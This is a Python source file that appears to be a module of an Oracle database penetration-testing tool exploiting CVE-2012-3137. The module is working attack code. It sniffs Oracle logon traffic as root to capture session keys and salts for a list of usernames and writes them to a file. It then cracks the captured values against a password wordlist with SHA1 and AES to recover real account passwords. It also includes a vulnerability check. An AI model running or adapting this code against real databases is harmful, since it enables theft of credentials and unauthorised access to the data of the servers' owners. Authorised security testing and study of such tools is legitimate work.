#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging, string, re, sys
from Utils import execSystemCmd, checkOptionsGivenByTheUser, anAccountIsGiven
from OracleDatabase import OracleDatabase
from time import sleep
import hashlib
from Crypto.Cipher import AES
from threading import Thread
from progressbar import *
from os import geteuid
from Constants import *

#Load scapy without warnings
tempout = sys.stdout; temperr = sys.stderr
sys.stdout = open('/dev/null', 'w'); sys.stderr = open('/dev/null', 'w')
try:
	from scapy.layers.inet import IP
	from scapy import all as scapyall #sniff, IP, Raw
	SCAPY_AVAILABLE = True
except ImportError:
	SCAPY_AVAILABLE = False
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
sys.stdout = tempout; sys.stderr = temperr
if SCAPY_AVAILABLE == False :
	logging.warning('You need to install python scapy if you want to use the CVE_2012_3137 module !')

class CVE_2012_3137 ():
	'''
	CVE-2012-3137 : to get remote passwords thanks to nmap
	'''
	
	sessionKey, salt = "", ""

	def __init__(self, args, accountsFile=None, timeSleep=0):
		'''
		Constructor
		'''
		logging.debug("CVE_2012_3137 object created")
		self.MAX_PACKET_TO_CAPTURE=200
		self.TIMEOUT=5
		self.args=args
		self.accountsFile = accountsFile
		self.timeSleep = timeSleep
		self.usernames = []
		if self.accountsFile != None : self.loadUsernames()
		self.keys = []
		self.passwdFound = []
		self.separator = "|<->|"
	
	def __resetSessionKeyValueAndSalt__(self):
		'''
		'''
		global sessionKey, salt
		sessionKey, salt = "", ""
		logging.debug('Session key and salt are now emply')

	def getKeys(self):
		'''
		return keys
		'''
		return self.keys

	def loadUsernames (self,separator = '/'):
		'''
		load usernames from self.accountsFile
		'''
		logging.info ("Loading usernames stored in {0}".format(self.accountsFile))
		f = open(self.accountsFile)
		for l in f:
			nl = l.replace('\n','').replace('\t','').split('/')
			self.usernames.append(nl[0])
		f.close()

	def __sniff_sessionkey_and_salt__(self,ip=None,port=None):
		'''
		To sniff the session key and the salt in an Oracle connection thanks to scapy
		'''
		def customAction(packet):
			global sessionKey, salt
			if packet[0].haslayer(IP)==True and packet[1].src == ip :
				#print packet.show()
				if packet[2].haslayer(scapyall.Raw)==True:
					raw = repr(packet[2].getlayer(scapyall.Raw).load)
					if "AUTH_SESSKEY" in raw and "AUTH_VFR_DATA" in raw:	
						sessionKey = re.findall(r"[0-9a-fA-F]{96}" ,raw[raw.index("AUTH_SESSKEY"):raw.index("AUTH_VFR_DATA")])
						if sessionKey != [] : 
							sessionKey = sessionKey[0]
							logging.info ("We have captured the session key: {0}".format(sessionKey))
						try : authVFRindex = raw.index("AUTH_VFR_DATA")
						except : logging.warning("The following string doesn't contain AUTH_VFR_DATA: {0}".format(raw))
						else:
							try: authGloIndex = raw.index("AUTH_GLOBALLY_UNIQUE_DBID")
							except : logging.warning("The following string doesn't contain AUTH_GLOBALLY_UNIQUE_DBID: {0}".format(raw))
							else:
								salt = re.findall(r"[0-9a-fA-F]{22}" ,raw[authVFRindex:authGloIndex])
								if salt != [] : 
									salt = salt[0][2:]
									logging.info ("We have captured the salt: {0}".format(salt))
						finally:
							return True
			return False
		self.__resetSessionKeyValueAndSalt__()
		scapyall.sniff(filter="tcp and host {0} and port {1}".format(ip,port), count=self.MAX_PACKET_TO_CAPTURE, timeout=self.TIMEOUT, stop_filter=customAction,store=False)
		return sessionKey, salt

	def __try_to_connect__(self, user):
		'''
		Establish a connection to the database
		'''
		import cx_Oracle
		try:
			connectString = "{0}/{1}@{2}:{3}/{4}".format(user, 'aaaaaaa', self.args['server'], self.args['port'], self.args['sid'])
			logging.debug("Connecting with {0}".format(connectString))
			cx_Oracle.connect(connectString)
		except Exception, e:
			pass

	def getAPassword(self,user):
		'''
		'''
		logging.debug("Sniffing is running in a new thread")
		a = Thread(None, self.__sniff_sessionkey_and_salt__, None, (), {'ip':self.args['server'],'port':self.args['port']})
		a.start()
		logging.debug("Waiting 3 seconds")
		sleep(3)
		logging.debug("Connection to the database via a new thread with the username {0}".format(self.args['user']))
		b = Thread(None, self.__try_to_connect__, None, (), {'user':user})
		b.start()
		b.join()
		a.join()
		return "",""
		

	def getPasswords(self):
		'''
		get passwords
		'''
		logging.info ("Getting remote passwords of {0} users".format(len(self.usernames)))
		pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=len(self.usernames)).start(), 0
		for user in self.usernames:
			logging.info("Try to get the session key and salt of the {0} user".format(user))
			self.getAPassword(user)
			nb += 1
			pbar.update(nb)
			if sessionKey != '' and salt != '':
				key = "{0}{3}{1}{3}{2}".format(user,sessionKey, salt,self.separator)
				self.keys.append(key)
				logging.debug("Key found: {0}".format(key))
			sleep(self.timeSleep)
		pbar.finish()

	def __decryptKey__(self, session, salt, password):
		'''
		'''
		pass_hash = hashlib.sha1(password+salt)
		key = pass_hash.digest() + '\x00\x00\x00\x00'
		decryptor = AES.new(key,AES.MODE_CBC,'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
		plain = decryptor.decrypt(session)
		return plain

	def decryptKeys(self, sessionFile, passwdFile):
		'''
		decrypt keyx
		'''
		#Nb sessions
		fsession, nbsession = open(sessionFile), 0
		for l in fsession: nbsession+=1
		fsession.close()
		logging.info("{0} sessions in the {1} file".format(nbsession,sessionFile))
		#Nb Passwds
		fpasswds, nbpasswds = open(passwdFile), 0
		for l in fpasswds: nbpasswds+=1
		fpasswds.close()
		logging.info("{0} passwords in the {1} file".format(nbpasswds,passwdFile))
		if nbpasswds == 0 : 
			logging.critical("No password in the {0} file".format(passwdFile))
			return []
		elif nbsession == 0:
			logging.critical("No session in the {0} file".format(sessionFile))
			return []
		else :
			fsession = open(sessionFile)
			for session in fsession:
				user, session_hex, salt_hex = session.replace('\n','').replace('\t','').split(self.separator)
				if session_hex=='[]' or salt_hex=='[]':
					logging.warning("There is not salt or session for '{0}', nothing to do! Probably not vulnerable...".format(user))
				else:
					self.args['print'].subtitle("Searching the password of the {0} user".format(user))
					fpasswd = open(passwdFile)
					pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=nbpasswds).start(), 0
					for password in fpasswd:
						nb +=1
						pbar.update(nb)
						password = password.replace('\n','').replace('\t','')
						session_id = self.__decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
						if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
							self.passwdFound.append([user,password])
							self.args['print'].goodNews("{0} password:{1}".format(user,password))
							fpasswd.close()
							break
					fpasswd.close()
					pbar.finish()
			fsession.close()
			return self.passwdFound

	def isVulnerable (self, user, password):
		'''
		Capture the challenge with the login and tries to recover the password with password
		Return True if the remote database is vulnerable
		Return False if not vulnerable.
		Return an error if an error.
		'''
		global sessionKey, salt
		logging.info("Try to know if the database server is vulnerable to the CVE-2012-3137")
		sessionKey, salt = "", "" 
		self.getAPassword(user)
		logging.info("The challenge captured for the user {0}: key='{1}', salt='{2}'".format(user, sessionKey, salt))
		if sessionKey != '' and salt != '' and sessionKey != [] and salt != []:
			session_id = self.__decryptKey__(sessionKey.decode('hex'),salt.decode('hex'),password)
			if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
				logging.info ("The database is vulnerable! Indeed, the result is good when you use the password '{0}' to decrypt the key '{1}' of the user {2} with the salt '{3}'".format(password, sessionKey, user, salt))
				return True
			else:
				logging.info ("The password {0} is not used in the challenge of the user {1}. Consequently, not vulnerable".format(password, user))
				return False
		else:
			logging.info ("The challenge captured is empty")
			return False

	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?")
		if self.args.has_key('user') == False or self.args.has_key('password') == False or self.args['user'] == None or self.args['password'] == None : 
			self.args['print'].unknownNews("Impossible to know if the database is vulnreable to the CVE-2012-3137.\nYou need to give VALID credentials on the database (-U and -P). Otherwise, the tool can't know if the database is vulnerable...")
		else:
			if 1==1:
				if geteuid() != 0:
					self.args['print'].unknownNews("Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database")
				else:
					vulneable = self.isVulnerable (self.args['user'], self.args['password'])
					if vulneable == True:
						self.args['print'].goodNews("OK")
					elif  vulneable == False:
						self.args['print'].badNews("KO")
					else:
						self.args['print'].badNews("There is an error {0}".format(vulnerable))
				'''
				if geteuid() != 0:
					args['print'].badNews("Sorry, you need to run this as root because I need to sniff authentications to the database")
				else:
					args['print'].info("Getting remote passwords on the {0} server, port {1}".format(self.args['server'],self.args['port']))
		'''

def runCVE20123137Module(args):
	'''
	Run the CVE_2012_3137 module
	'''
	if checkOptionsGivenByTheUser(args,["test-module","get-all-passwords","decrypt-sessions"],checkAccount=False) == False : return EXIT_MISS_ARGUMENT
	cve = CVE_2012_3137 (args,  accountsFile=args['user-list'], timeSleep=args['timeSleep'])
	if args['test-module'] == True :
		cve.testAll()
	#Option 1: get all passwords
	if args['get-all-passwords'] != None:
		if geteuid() != 0:
			args['print'].badNews("Sorry, you need to run this as root because I need to sniff authentications to the database")
		else:
			args['print'].title("Getting remote passwords on the {0} server, port {1}".format(args['server'],args['port']))
			cve.getPasswords()
			keys = cve.getKeys()
			if keys != []:
				args['print'].goodNews("Here are keys:\n\n{0}\n\nIf for some users keys are empty, there was an error during capture or this Oracle user does not exist on the database".format('\n'.join(keys)))
				filename = "sessions-{0}-{1}-{2}{3}".format(args['server'],args['port'],args['sid'],CHALLENGE_EXT_FILE)
				f = open(filename,"w")
				f.write('\n'.join(keys))
				f.close()
				args['print'].goodNews("Sessions strored in the {0} file.".format(filename))
			else : 
				args['print'].badNews("Impossible to exploit this vulnreability")
	#Option 2: decrypt sessions
	if args['decrypt-sessions'] != None:
		args['print'].title("Decrypt sessions stored in {0} via {1}".format(args['decrypt-sessions'][0],args['decrypt-sessions'][1]))
		passwds = cve.decryptKeys(args['decrypt-sessions'][0], args['decrypt-sessions'][1])
		if passwds != []:
			passwordsStr = ""
			for e in passwds : 
				passwordsStr +='{0}:{1}\n'.format(e[0],e[1])
			args['print'].goodNews("Accounts found:\n{0}".format(passwordsStr))
		else:
			args['print'].badNews("No password has been found")





